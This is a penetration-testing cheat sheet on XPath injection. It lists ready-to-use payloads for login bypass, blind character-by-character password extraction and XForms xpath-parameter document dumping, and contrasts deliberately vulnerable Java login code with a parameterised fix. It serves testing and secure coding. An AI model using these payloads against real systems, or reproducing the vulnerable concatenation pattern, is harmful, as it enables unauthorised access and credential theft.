*XPath Injection* is when user input is embedded into an XPath query without sanitization  allowing an attacker to manipulate the query logic, bypass authentication, or extract data from XML documents. It's the XML equivalent of SQLi.


```xml
Application builds XPath query with user input: "//users/user[username/text()='" + username + "' and password/text()='" + password + "']"

 Attacker injects: username = admin' or '1'='1 Result: "//users/user[username/text()='admin' or '1'='1' and password/text()='x']" → returns the admin node regardless of password
```

```xml
	"id":"0","ctxPath":"/","xpath":"node()","type":"STRING"
```

Common targets: XML-based data stores, LDAP-backed apps, config files, SOAP/XForms services.

## Injection Points

- Login forms backed by XML user stores
- Search fields querying XML data
- XForms submissions with `xpath` parameters:

http

```http
	"id":"0","ctxPath":"/","xpath":"node()","type":"STRING"
```

```
Inject into the `xpath` value — server evaluates it directly against the XML document
```

- SOAP body parameters processed with XPath
- URL parameters used to filter/select XML nodes
- HTTP headers passed into XPath queries

---

## Checklist

### Detection

- [ ]  Inject a single quote `'`  does the app throw an XML/XPath parse error?
- [ ]  Inject always-true condition and check if behaviour changes:

```
	' or '1'='1
	" or "1"="1
```

- [ ]  Inject always-false condition and confirm difference:

```
	' and '1'='2
```

- [ ]  Check for math evaluation  inject `1+1`, if `2` is returned, expression evaluation is live

### Authentication Bypass

- [ ]  Classic bypass  return all user nodes:

```
	username: admin' or '1'='1
	password: anything
```

- [ ]  Null out the password check entirely:

```
	username: admin
	password: x' or '1'='1
```

- [ ]  Force true with chained OR:

```
	admin' or 1=1 or ''='
```

### Blind XPath — Boolean Extraction

- [ ]  Confirm blind injection  different responses for true/false:

```
	' and substring(//user[1]/password,1,1)='a
	' and substring(//user[1]/password,1,1)='b
```

- [ ]  Extract node count:

```
	' and count(//user)=1 or '1'='2
```

- [ ]  Extract node names character by character:

```
	' and substring(name(/*[1]),1,1)='u
```

- [ ]  Extract value length before brute forcing chars:

```
	' or string-length(//user[1]/password)=8 or '
```

### XForms XPath Injection

- [ ]  Find XForms requests with an `xpath` parameter in the body
- [ ]  Replace `node()` with a crafted expression:

json

```json
	{"id":"0","ctxPath":"/","xpath":"//users/user[role='admin']/password/text()","type":"STRING"}
```

- [ ]  Try dumping the full document:

json

```json
	{"xpath":"//*"}
```

### Data Extraction via XPath Axes

- [ ]  Walk the document tree:

```
	' or 1=1]/ancestor::* | //x['
```

- [ ]  Dump all child nodes:

```
	//child::*
	//*
```

---

## Attack Payloads

**Auth bypass — login as first user:**

```
username: ' or '1'='1
password: ' or '1'='1
```

**Auth bypass targeting specific user:**

```
username: admin' or '1'='1' or 'x'='x
password: anything
```

**Blind — extract password char by char:**

```
' and substring(//user[username/text()='admin']/password/text(),1,1)='s' and '1'='1
```

**XForms node extraction:**

```json
{"id":"0","ctxPath":"/","xpath":"//users/user[1]/password/text()","type":"STRING"}
```

---

## White Box Testing

**Vulnerable — user input concatenated directly into XPath query:**


```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    String xpath = "//users/user[username/text()='" + req.getUsername()
                 + "' and password/text()='" + req.getPassword() + "']";

    // ← attacker controls the query structure entirely
    NodeList result = (NodeList) xPath.evaluate(xpath, xmlDocument, XPathConstants.NODESET);

    if (result.getLength() > 0) {
        return ResponseEntity.ok("Logged in");
    }
    return ResponseEntity.status(401).build();
}
```

**Vulnerable — XForms xpath param evaluated directly:**

```java
@PostMapping("/xforms/submit")
public ResponseEntity<?> xformsSubmit(@RequestBody Map<String, String> body) {
    String xpathExpr = body.get("xpath"); // ← attacker-controlled, no validation
    Object result = xPath.evaluate(xpathExpr, xmlDocument, XPathConstants.STRING);
    return ResponseEntity.ok(result);
}
```

**Secure:**

```java
// Use parameterised XPath via XPathVariableResolver — never concatenate input
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    XPathExpression expr = xPath.compile(
        "//users/user[username/text()=$username and password/text()=$password]"
    );

    SimpleVariableResolver resolver = new SimpleVariableResolver();
    resolver.addVariable(new QName("username"), req.getUsername());
    resolver.addVariable(new QName("password"), req.getPassword());
    xPath.setXPathVariableResolver(resolver);

    NodeList result = (NodeList) expr.evaluate(xmlDocument, XPathConstants.NODESET);
    if (result.getLength() > 0) {
        return ResponseEntity.ok("Logged in");
    }
    return ResponseEntity.status(401).build();
}

// Never expose raw XPath evaluation to user input
// Whitelist allowed expressions if dynamic queries are needed
private static final Map<String, String> ALLOWED_QUERIES = Map.of(
    "getUserProfile", "//users/user[username/text()=$username]",
    "getPublicPosts",  "//posts/post[public/text()='true']"
);
```

---

## Resources

- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [HackTricks XPath Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
- [PayloadsAllTheThings XPath](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)